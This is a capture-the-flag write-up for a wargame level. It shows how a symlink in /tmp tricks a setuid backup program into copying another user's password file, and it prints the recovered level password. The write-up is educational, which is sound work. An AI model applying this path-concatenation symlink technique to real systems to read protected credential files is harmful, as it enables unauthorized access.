# level08

Nothing of note with `ll`.
`checksec` tells us that the `Full RELRO`, and `Canary found` protections are present.
`Full RELRO` means that all symbols are resolved on program start, a **GOT overwrite** attack will not be possible.
`Canary found` indicates that **stack smashing** (traditionnal buffer overflows) will cause a program crash if the canary is overwritten.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|strcpy|main|
|write|log_wrapper|
|printf||
|snprintf||
|strncat||
|fgetc||
|close||
|strcspn||
|fprintf||
|open||
|fopen||
|exit||

This program does 4 main actions :
- Opening the `./backups/.log` file.
- Opening the `{argv[1]}` file.
- Opening the `./backups/{argv[1]}` file, creating it if it does not exist.
- Writes the contents of `{argv[1]}` inside `./backups/{argv[1]}`.

We want to read the contents of `/home/users/level09/.pass` unfortunately, when we try to open the contents of this file from `/home/users/level08/` we get an error.
```sh
pwd
/home/users/level08

./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

And we cannot create a path to match the one required by the program
```sh
mkdir -p ./backups//home/users/level09
mkdir: cannot create directory `./backups//home': Permission denied
```

So we need a path to the `.pass` file that has a valid path in the `./backups` directory. Therefore, our path cannot start with a `/` character.
We could start the program from **root** directly and ommit the leading `/` character.

```sh
cd /
home/users/level08/level08 home/users/level09/.pass
ERROR: Failed to open ./backups/.log
```

We got a different error! This time, the `./backups` directory does not exist and we do not have the required permissions to create it.

```sh
mkdir ./backups
mkdir: cannot create directory `./backups': Permission denied
```

We need to find a way to have a `./backups/` directory as well as a path to `.pass` without a leading `/` character. Let's use an underrated property of the Linux filesystem, **Symbolic Links**!

```sh
ls /
bin	dev [...]

cd /tmp/

ln -s / pasteque
ls pasteque
bin dev [...]

# We have a way to access / without a leading '/' character
# Now we require a `./backups` directory with the correct path

mkdir -p backups/pasteque/home/users/level09/

# Let's try it!
/home/users/level08/level08 pasteque/home/users/level09/.pass
cat backups/pasteque/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

This trick works because the program does not differentiate between a true directory and a symlink.

When `{argv[1]}` is opened it is treated as a path that goes through the `pasteque` symlink to `/`. But when the output file is opened in `backups/`, `pasteque` is treated as a true directory.

This exploit works because the parsing and path opening is done carelessly by concatenating `./backups` with `{argv[1]}`.

```sh
su level09
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

> [The End]
>> Or the beginning?
